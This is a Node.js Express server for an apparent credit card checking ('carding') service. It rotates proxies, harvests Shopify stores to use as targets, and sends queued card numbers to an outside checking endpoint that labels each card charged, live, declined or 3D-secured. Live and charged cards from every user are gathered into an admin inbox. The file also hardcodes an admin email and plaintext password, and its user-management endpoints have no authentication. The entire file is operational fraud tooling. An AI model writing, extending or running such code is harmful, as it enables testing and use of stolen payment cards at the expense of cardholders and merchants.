const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static(__dirname));

// ─── GLOBAL MEMORY DATABASE ───
const db = {
  apiKey: '', 
  users: [
    { email: 'yousafcodes.de@gmail.com', pass: 'YOUSAFCODES.DE', role: 'admin', name: 'Oggy Admin', status: 'active' }
  ],
  sites: [
    { domain: 'shopify.com', price: '29.00', currency: 'USD' }
  ],
  proxies: [],
  inbox: [],
  activity: [],
  tasks: {} // Store background tasks per user
};

// ─── BULLETPROOF PROXY FORMATTER ───
function formatProxy(proxyStr) {
  if (!proxyStr) return null;
  let p = proxyStr.trim();
  p = p.replace(/^(socks5|socks4|http|https):\/\//i, '');
  if (p.includes('@')) return `http://${p}`;
  const parts = p.split(':');
  if (parts.length === 4) return `http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
  if (parts.length === 2) return `http://${parts[0]}:${parts[1]}`;
  return `http://${p}`;
}

// ─── AUTH & USER MANAGEMENT ───
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  const user = db.users.find(u => u.email === email && u.pass === password && u.status === 'active');
  if (user) res.json({ user: { email: user.email, name: user.name, role: user.role } });
  else res.status(401).json({ error: 'Invalid credentials' });
});

app.get('/api/users', (req, res) => res.json(db.users));
app.post('/api/register', (req, res) => {
  const { email, password, name, role } = req.body;
  if (db.users.find(u => u.email === email)) return res.status(400).json({ error: 'Email exists' });
  db.users.push({ email, pass: password, name, role, status: 'active', checked: 0 });
  res.json({ success: true });
});
app.post('/api/user/status', (req, res) => {
  const user = db.users.find(u => u.email === req.body.email);
  if (user) { user.status = req.body.status; res.json({ success: true }); }
  else res.status(404).json({ error: 'Not found' });
});
app.post('/api/user/delete', (req, res) => {
  db.users = db.users.filter(u => u.email !== req.body.email);
  res.json({ success: true });
});

// ─── ADMIN: SETTINGS ───
app.get('/api/settings', (req, res) => res.json({ apiKey: db.apiKey }));
app.post('/api/settings', (req, res) => {
  db.apiKey = req.body.apiKey || '';
  res.json({ success: true });
});

// ─── ADMIN: SITE CHECKER ───
app.get('/api/sites', (req, res) => res.json(db.sites));

app.post('/api/check-sites', async (req, res) => {
  const { sites } = req.body;
  if (!sites || !sites.length) return res.json({ success: true, live: 0, total: db.sites.length });

  const liveSites = [];
  
  for (let i = 0; i < sites.length; i += 5) {
    const batch = sites.slice(i, i + 5);
    const results = await Promise.all(batch.map(async (s) => {
      let domain = s.trim().replace(/^https?:\/\//, '').replace(/\/+$/, '');
      if (!domain) return null;
      
      let proxyStr = null;
      if (db.proxies.length > 0) proxyStr = db.proxies[Math.floor(Math.random() * db.proxies.length)];
      
      const options = { timeout: 8000 };
      if (proxyStr) {
        const formatted = formatProxy(proxyStr);
        if (formatted) options.httpsAgent = new HttpsProxyAgent(formatted);
      }

      let cheapestPrice = 'N/A';
      let currency = 'USD';

      try {
        const prodRes = await axios.get(`https://${domain}/products.json?limit=250`, options);
        if (prodRes.status === 200 && prodRes.data && Array.isArray(prodRes.data.products)) {
          if (prodRes.data.products.length > 0) {
            let minPrice = Infinity;
            prodRes.data.products.forEach(prod => {
              if (prod.variants) {
                prod.variants.forEach(v => {
                  const p = parseFloat(v.price);
                  if (!isNaN(p) && p < minPrice && p > 0) minPrice = p;
                });
              }
            });
            if (minPrice !== Infinity) cheapestPrice = minPrice.toFixed(2);
          }
          return { domain, price: cheapestPrice, currency };
        }
      } catch (err) {}
      return null;
    }));
    
    results.forEach(r => { if (r) liveSites.push(r); });
  }

  const existingDomains = db.sites.map(s => s.domain);
  liveSites.forEach(newSite => {
    if (!existingDomains.includes(newSite.domain)) db.sites.push(newSite);
    else {
      const idx = db.sites.findIndex(s => s.domain === newSite.domain);
      if (idx !== -1) db.sites[idx] = newSite;
    }
  });

  res.json({ success: true, live: liveSites.length, total: db.sites.length });
});

app.delete('/api/sites', (req, res) => {
  const { domain } = req.body;
  if (!domain) return res.status(400).json({ error: 'Domain required' });
  const before = db.sites.length;
  db.sites = db.sites.filter(s => s.domain !== domain);
  res.json({ success: true, removed: before - db.sites.length, total: db.sites.length });
});

// ─── ADMIN: PROXY CHECKER ───
app.get('/api/proxies', (req, res) => res.json(db.proxies));

app.post('/api/check-proxies', async (req, res) => {
  const { proxies } = req.body;
  if (!proxies || !proxies.length) return res.json({ success: true, live: 0, total: db.proxies.length });

  const liveProxies = [];
  
  for (let i = 0; i < proxies.length; i += 20) {
    const batch = proxies.slice(i, i + 20);
    const results = await Promise.all(batch.map(async (p) => {
      const formatted = formatProxy(p);
      try {
        const agent = new HttpsProxyAgent(formatted);
        await axios.get('https://api.ipify.org?format=json', { httpsAgent: agent, timeout: 8000 });
        return p;
      } catch (err) { return null; }
    }));
    results.forEach(r => { if (r) liveProxies.push(r); });
  }

  db.proxies = [...new Set([...db.proxies, ...liveProxies])];
  res.json({ success: true, live: liveProxies.length, total: db.proxies.length });
});

app.delete('/api/proxies', (req, res) => {
  const { proxy } = req.body;
  if (!proxy) return res.status(400).json({ error: 'Proxy required' });
  const before = db.proxies.length;
  db.proxies = db.proxies.filter(p => p !== proxy);
  res.json({ success: true, removed: before - db.proxies.length, total: db.proxies.length });
});

// ─── BACKGROUND TASK SYSTEM ───
app.post('/api/start-task', (req, res) => {
  const { email, cards } = req.body;
  if (!email || !cards || !cards.length) return res.status(400).json({ error: 'Missing data' });

  if (db.tasks[email] && db.tasks[email].status === 'running') {
    return res.status(400).json({ error: 'Task already running' });
  }

  db.tasks[email] = {
    status: 'running',
    queue: [...cards],
    results: [],
    total: cards.length,
    checked: 0
  };

  processUserTask(email); // Run in background
  res.json({ success: true });
});

app.get('/api/task-status', (req, res) => {
  const email = req.query.email;
  if (!email) return res.status(400).json({ error: 'Missing email' });
  const task = db.tasks[email];
  if (!task) return res.json({ active: false });
  res.json({ active: task.status === 'running', task });
});

app.post('/api/stop-task', (req, res) => {
  const { email } = req.body;
  if (db.tasks[email]) db.tasks[email].status = 'stopped';
  res.json({ success: true });
});

// Retry logic for API Throttling
async function checkCardWithRetry(cc) {
  let attempts = 0;
  while (attempts < 3) {
    attempts++;
    let proxyStr = null;
    let proxyUrl = null;

    if (db.proxies.length > 0) {
      const idx = Math.floor(Math.random() * db.proxies.length);
      proxyStr = db.proxies[idx];
      proxyUrl = formatProxy(proxyStr);
    }

    const siteObj = db.sites.length > 0 ? db.sites[Math.floor(Math.random() * db.sites.length)] : { domain: 'shopify.com' };
    const site = siteObj.domain;

    const targetUrl = new URL('https://check.yzio.app/shopify');
    targetUrl.searchParams.append('site', site);
    targetUrl.searchParams.append('cc', cc);
    if (db.apiKey && db.apiKey.trim() !== '') targetUrl.searchParams.append('key', db.apiKey.trim());
    if (proxyStr) targetUrl.searchParams.append('proxy', proxyStr);

    try {
      const options = { timeout: 20000 };
      if (proxyUrl) options.httpsAgent = new HttpsProxyAgent(proxyUrl);
      
      const response = await axios.get(targetUrl.toString(), options);
      const data = response.data;
      const apiResponse = String(data.Response || data.response || data.status || data.result || '').toUpperCase();
      
      // Catch throttled responses and retry
      if (apiResponse.includes('THROTTLED')) {
        console.log(`[Throttled] Waiting 2s and retrying ${cc}...`);
        await new Promise(r => setTimeout(r, 2000));
        continue; 
      }

      return { success: true, data };
    } catch (err) {
      console.log(`[Error] ${cc}: ${err.message}. Retrying...`);
      if (proxyStr && (err.code === 'ECONNABORTED' || err.message.includes('connect'))) {
        db.proxies = db.proxies.filter(p => p !== proxyStr);
      }
      await new Promise(r => setTimeout(r, 1000));
    }
  }
  return { success: false, error: 'Max retries reached (Throttled/Dead)' };
}

async function processUserTask(email) {
  const task = db.tasks[email];
  
  while (task.queue.length > 0 && task.status === 'running') {
    const cc = task.queue.shift();
    const result = await checkCardWithRetry(cc);
    
    if (result.success) {
      const data = result.data;
      let apiResponse = String(data.Response || data.response || data.status || data.result || '').toUpperCase();
      let isSuccess = data.Status === true;
      let gateway = data.Gateway || '';
      let price = data.Price || null;
      
      let displayLabel = 'UNKNOWN';
      let uiStatus = 'unknown';

      if (apiResponse.includes('CHARGED') || apiResponse.includes('SUCCESS')) {
        displayLabel = 'CHARGED'; uiStatus = 'charged';
      } else if (apiResponse.includes('LIVE') || apiResponse.includes('APPROVED') || apiResponse.includes('INSUFFICIENT') || (isSuccess && apiResponse !== 'CARD_DECLINED')) {
        displayLabel = 'LIVE'; uiStatus = 'live';
      } else if (apiResponse.includes('DECLINED') || apiResponse.includes('DEAD') || isSuccess === false) {
        displayLabel = 'DECLINED'; uiStatus = 'declined';
      } else if (apiResponse.includes('3DS') || apiResponse.includes('OTP') || apiResponse.includes('AUTHENTICATION')) {
        displayLabel = '3D'; uiStatus = 'otp';
      } else if (apiResponse) {
        displayLabel = apiResponse.substring(0, 12);
      }

      let message = apiResponse;
      if (gateway) message = `${gateway} - ${apiResponse}`;
      if (price) message += ` ($${price})`;

      const entry = {
        id: Date.now() + Math.random(),
        cc, status: uiStatus, label: displayLabel, message: message || 'No message', rawJSON: data, time: new Date().toISOString()
      };

      task.results.push(entry);
      
      // Global Activity
      db.activity.unshift({ user: email, action: 'check', card: cc, result: uiStatus, time: entry.time });
      if (db.activity.length > 500) db.activity.pop();
      
      // Admin Inbox
      if (uiStatus === 'charged' || uiStatus === 'live') {
        db.inbox.unshift({ user: email, cc: cc, message: displayLabel, time: entry.time });
        if (db.inbox.length > 500) db.inbox.pop();
      }
    } else {
      task.results.push({
        id: Date.now() + Math.random(),
        cc, status: 'unknown', label: 'ERROR', message: result.error || 'Failed', rawJSON: {}, time: new Date().toISOString()
      });
    }
    
    task.checked++;
  }
  
  task.status = 'done';
}

// ─── REPORTING & ACTIVITY (PRIVACY FIX) ───
app.get('/api/admin/data', (req, res) => {
  const email = req.query.email;
  let inbox = db.inbox;
  let activity = db.activity;

  if (email && email !== 'yousafcodes.de@gmail.com') {
    inbox = inbox.filter(i => i.user === email);
    activity = activity.filter(a => a.user === email);
  }

  res.json({ inbox, activity });
});

// ─── SERVE FRONTEND ───
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
